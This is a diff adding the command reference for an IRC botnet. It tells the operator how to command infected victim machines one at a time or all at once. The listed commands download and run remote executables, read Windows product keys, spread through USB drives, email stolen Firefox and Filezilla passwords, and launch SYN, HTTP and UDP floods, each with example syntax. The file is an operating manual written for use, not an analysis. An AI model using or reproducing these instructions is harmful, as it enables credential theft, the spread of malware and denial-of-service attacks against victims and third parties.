@@ -1,0 +1,89 @@
+Note: 
+*When updating old bots, just bind the stub to any file you want, the binded file won't be run when it is updating. (I'd use a blank form or "Hello world" program personally, to keep the download size small for your bots)
+*If a bot disconnects from your IRC while DOSing a host, it will stop it's DOS as a precaution to prevent instances where the bot might be tied up from DOSing and is never able to rejoin your IRC server for the command to stop.
+
+
+List of all commands and examples:
+
+**You can command all of your bots at once by using "all", or do them one-by-one by using the indivial bot's nickname on IRC**
+ex: `Release [USA-Win7x32]37670
+    `Release all
+
+*`Release - Completely remove the bot from their computer
+ --`Release <botname or "all">
+ ----example: `release all
+ 
+ 
+*`Update - Update the bot to a new version
+ --`Update <botname or "all"> URL|version
+ ----example: `update [USA][Win7_]12000 http://www.google.com/update.exe|1.5
+
+
+*`WindowsKey - Show windows key/product key
+ --`WindowsKey <botname or "all">
+ ----example: `WindowsKey all
+ 
+ 
+*`Drives - Show removable drives connected to the computer (usb drives)
+ --`Drives <botname or "all">
+ ----example: `Drives all
+ 
+ 
+*`Spread - Spread to removable drives (ex: usb)
+ --`Spread <botname or "all">
+ ----example: `Spread all
+ 
+ 
+*`Info - Show operating system version, windows username, ip, bot version
+ --`Info <botname or "all">
+ ----example: `Info [USA][XPx64]96071
+ 
+ 
+*`Version - Show bot version
+ --`Version <botname or "all">
+ ----example: `version all
+ 
+ 
+*`Download - Download a file to their computer & run it
+ --`Download <botname or "all"> Direct_Download_Link File_to_run_as
+ ----example: `Download all http://www.google.com/file.exe notepad.exe
+ 
+
+*`SpeedTest - Run a speed test on their computer, returns the speed in KB/s. 
+                Direct_Download_Link being the file to download (1 - 5 MB file size recommended)
+ --`SpeedTest <botname or "all"> Direct_Download_Link
+ ----example: `SpeedTest all http://www.google.com/file.exe
+
+
+*`Die - Terminate the bot instance, but don't remove it from their computer
+ --`Die <botname or "all">
+ ----example: `Die all
+ 
+ 
+*`Firefox - Email you their Firefox and Filezilla passwords
+ --`Firefox <botname or "all">
+ ----example: `Firefox [USA][WinXP]73789
+ 
+ 
+*`SYN - SYN Flood (http://en.wikipedia.org/wiki/SYN_flood)
+ --`SYN <botname or "all"> IP/host Port threads
+ ----example: `SYN all 127.0.0.1 80 5
+ 
+ 
+*`HTTP - HTTP Flood
+ --`HTTP <botname or "all"> IP/host Port threads delay
+ ----example: `HTTP all 127.0.0.1 80 10
+ 
+*`UDP - UDP Flood (http://en.wikipedia.org/wiki/UDP_flood_attack)
+ --`UDP <botname or "all"> IP/host Port
+ ----example: `UDP all 127.0.0.1 80 10
+
+ 
+*`StopFlood - stop the DOS
+ --`StopFlood <botname or "all">
+ ----example: `StopFlood all
+ 
+ 
+ *`Part - Join another channel on the irc server. 
+ --`Part <botname or "all"> #Channel
+ ----example: `Part all #NewChannel
